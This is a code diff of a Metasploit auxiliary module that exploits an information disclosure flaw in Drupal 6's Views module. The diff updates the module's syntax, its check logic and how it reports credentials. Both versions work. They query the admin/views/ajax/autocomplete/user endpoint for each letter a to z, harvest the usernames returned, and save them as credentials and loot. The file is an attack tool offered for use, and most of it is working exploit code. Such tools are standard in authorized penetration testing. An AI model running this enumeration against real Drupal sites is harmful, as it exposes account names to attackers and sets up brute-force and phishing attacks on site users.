@@ -1,136 +1,152 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::WmapScanServer
+  include Msf::Auxiliary::Report
+  include Msf::Auxiliary::Scanner
 
-class Metasploit3 < Msf::Auxiliary
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Drupal Views Module Users Enumeration',
+      'Description'    => %q{
+        This module exploits an information disclosure vulnerability in the 'Views'
+        module of Drupal, brute-forcing the first 10 usernames from 'a' to 'z'.
+        Drupal 6 with 'Views' module <= 6.x-2.11 are vulnerable.  Drupal does not
+        consider disclosure of usernames as a weakness.
+      },
+      'Author'         =>
+        [
+          'Justin Klein Keane', #Original Discovery
+          'Robin Francois <rof[at]navixia.com>',
+          'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['URL', 'http://www.madirish.net/node/465'],
+          ['URL', 'https://www.drupal.org/node/1004778'],
+        ],
+      'DisclosureDate' => '2010-07-02'
+    ))
 
-	include Msf::Exploit::Remote::HttpClient
-	include Msf::Auxiliary::WmapScanServer
-	include Msf::Auxiliary::Report
-	include Msf::Auxiliary::Scanner
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, "Drupal Path", "/"])
+      ])
+  end
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'           => 'Drupal Views Module Users Enumeration',
-			'Description'    => %q{
-				This module exploits an information disclosure vulnerability in the 'Views'
-				module of Drupal, brute-forcing the first 10 usernames from 'a' to 'z'
-			},
-			'Author'         =>
-				[
-					'Justin Klein Keane', #Original Discovery
-					'Robin Francois <rof[at]navixia.com>',
-					'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
-				],
-			'License'        => MSF_LICENSE,
-			'References'     =>
-				[
-					['URL', 'http://www.madirish.net/node/465'],
-				],
-			'DisclosureDate' => 'Jul 2 2010'
-		))
+  def base_uri
+    @base_uri ||= normalize_uri("#{target_uri.path}/?q=admin/views/ajax/autocomplete/user/")
+  end
 
-		register_options(
-			[
-				OptString.new('PATH', [true, "Drupal Path", "/"])
-			], self.class)
-	end
+  def check_host(ip)
+    res = send_request_cgi(
+      'uri'     => base_uri,
+      'method'  => 'GET',
+      'headers' => { 'Connection' => 'Close' }
+    )
 
-	def check(base_uri)
-		res = send_request_cgi({
-			'uri'     => base_uri,
-			'method'  => 'GET',
-			'headers' => { 'Connection' => 'Close' }
-		}, 25)
+    unless res
+      return Exploit::CheckCode::Unknown
+    end
 
-		if not res
-			return false
-		elsif res and res.body =~ /\<title\>Access denied/
-			# This probably means the Views Module actually isn't installed
-			print_error("#{rhost} - Access denied")
-			return false
-		elsif res and res.message != 'OK' or res.body != '[  ]'
-			return false
-		else
-			return true
-		end
-	end
+    if res.body.include?('Access denied')
+      # This probably means the Views Module actually isn't installed
+      print_error("Access denied")
+      return Exploit::CheckCode::Safe
+    elsif res.message != 'OK' || res.body != '[  ]'
+      return Exploit::CheckCode::Safe
+    else
+      return Exploit::CheckCode::Appears
+    end
+  end
 
-	def run_host(ip)
-		# Make sure the URIPATH begins with '/'
-		datastore['PATH'] = normalize_uri(datastore['PATH'])
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: (ssl ? 'https' : 'http'),
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
 
-		# Make sure the URIPATH ends with /
-		if datastore['PATH'][-1,1] != '/'
-			datastore['PATH'] = datastore['PATH'] + '/'
-		end
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user]
+    }.merge(service_data)
 
-		enum_uri = datastore['PATH'] + "?q=admin/views/ajax/autocomplete/user/"
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
 
-		# Check if remote host is available or appears vulnerable
-		if not check(enum_uri)
-			print_error("#{ip} does not appear to be vulnerable, will not continue")
-			return
-		end
+    create_credential_login(login_data)
+  end
 
-		print_status("Begin enumerating users at #{ip}")
+  def run_host(ip)
+    # Check if remote host is available or appears vulnerable
+    unless check_host(ip) == Exploit::CheckCode::Appears
+      print_error("#{ip} does not appear to be vulnerable, will not continue")
+      return
+    end
 
-		results = []
-		('a'..'z').each do |l|
-			vprint_status("Iterating on letter: #{l}")
+    print_status("Begin enumerating users at #{vhost}")
 
-			res = send_request_cgi({
-				'uri'     => enum_uri+l,
-				'method'  => 'GET',
-				'headers' => { 'Connection' => 'Close' }
-			}, 25)
+    results = []
+    ('a'..'z').each do |l|
+      vprint_status("Iterating on letter: #{l}")
 
-			if (res and res.message == "OK")
-				user_list = res.body.scan(/\w+/)
-				if user_list.empty?
-					vprint_line("\tFound: Nothing")
-				else
-					vprint_line("\tFound: #{user_list.inspect}")
-					results << user_list
-				end
-			else
-				print_error("Unexpected results from server")
-				return
-			end
-		end
+      res = send_request_cgi(
+        'uri'     => "#{base_uri}#{l}",
+        'method'  => 'GET',
+        'headers' => { 'Connection' => 'Close' }
+      )
 
-		final_results = results.flatten.uniq
+      if res && res.message == 'OK'
+        begin
+          user_list = JSON.parse(res.body)
+        rescue JSON::ParserError => e
+          elog('Exception encountered parsing JSON response', error: e)
+          return []
+        end
+        if user_list.empty?
+          vprint_error("Not found with: #{l}")
+        else
+          vprint_good("Found: #{user_list}")
+          results << user_list.flatten.uniq
+        end
+      else
+        print_error("Unexpected results from server")
+        return
+      end
+    end
+    results = results.flatten.uniq
+    print_status("Done. #{results.length} usernames found...")
+    results.each do |user|
+      print_good("Found User: #{user}")
 
-		print_status("Done. " + final_results.length.to_s + " usernames found...")
+      report_cred(
+        ip: Rex::Socket.getaddress(datastore['RHOST']),
+        port: datastore['RPORT'],
+        user: user,
+        proof: base_uri
+      )
+    end
 
-		final_results.each do |user|
-			print_good("Found User: #{user}")
-
-			report_auth_info(
-				:host => Rex::Socket.getaddress(datastore['RHOST']),
-				:port => datastore['RPORT'],
-				:user => user,
-				:type => "drupal_user"
-			)
-		end
-
-		# One username per line
-		final_results = final_results * "\n"
-
-		p = store_loot(
-			'drupal_user',
-			'text/plain',
-			Rex::Socket.getaddress(datastore['RHOST']),
-			final_results.to_s,
-			'drupal_user.txt'
-		)
-
-		print_status("Usernames stored in: #{p}")
-	end
-
+    results = results * "\n"
+    p = store_loot(
+      'drupal_user',
+      'text/plain',
+      Rex::Socket.getaddress(datastore['RHOST']),
+      results.to_s,
+      'drupal_user.txt'
+    )
+    print_status("Usernames stored in: #{p}")
+  end
 end
